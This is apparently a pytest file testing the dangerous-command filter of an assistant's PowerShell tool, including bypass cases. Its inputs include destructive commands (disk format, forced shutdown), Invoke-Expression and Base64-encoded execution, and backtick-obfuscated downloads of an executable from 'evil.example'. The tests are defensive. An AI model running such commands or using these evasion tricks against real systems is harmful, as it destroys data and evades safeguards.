from __future__ import annotations

from friday.tools.shell import _check_dangerous, _is_download_command, run_powershell


def test_check_dangerous_format_disk():
    assert _check_dangerous("format C:") == "格式化磁盘"


def test_check_dangerous_shutdown():
    assert _check_dangerous("Stop-Computer -Force") == "关机/重启"


def test_check_dangerous_safe_command():
    assert _check_dangerous("Get-ChildItem $env:USERPROFILE") is None


def test_run_powershell_blocks_dangerous():
    result = run_powershell("format D:")
    assert "拒绝" in result or "⛔" in result


# --- bypass 回归（P3）：反引号 / 大小写 / 编码参数 ---


def test_check_dangerous_blocks_backtick_format():
    assert _check_dangerous("for`mat C:") == "格式化磁盘"


def test_check_dangerous_blocks_backtick_shutdown():
    assert _check_dangerous("St`op-Computer") == "关机/重启"


def test_check_dangerous_blocks_case_insensitive_format():
    assert _check_dangerous("FORMAT d:") == "格式化磁盘"


def test_check_dangerous_blocks_encoded_command_flags():
    assert _check_dangerous("-EncodedCommand ABC") == "使用 Base64 编码命令"
    assert _check_dangerous("powershell -enc AAA") == "使用 Base64 编码命令"


def test_check_dangerous_blocks_invoke_expression():
    assert _check_dangerous("IEX (Get-Content evil.ps1)") == "动态执行 PowerShell 代码"
    assert _check_dangerous("Invoke-Expression $code") == "动态执行 PowerShell 代码"


def test_download_detection_blocks_backtick_iwr():
    assert _is_download_command("I`WR https://example.com/x.exe")


def test_run_powershell_blocks_backtick_download():
    result = run_powershell("I`WR https://evil.example/a.exe -OutFile C:/a.exe")
    assert "download" in result.lower() or "⛔" in result
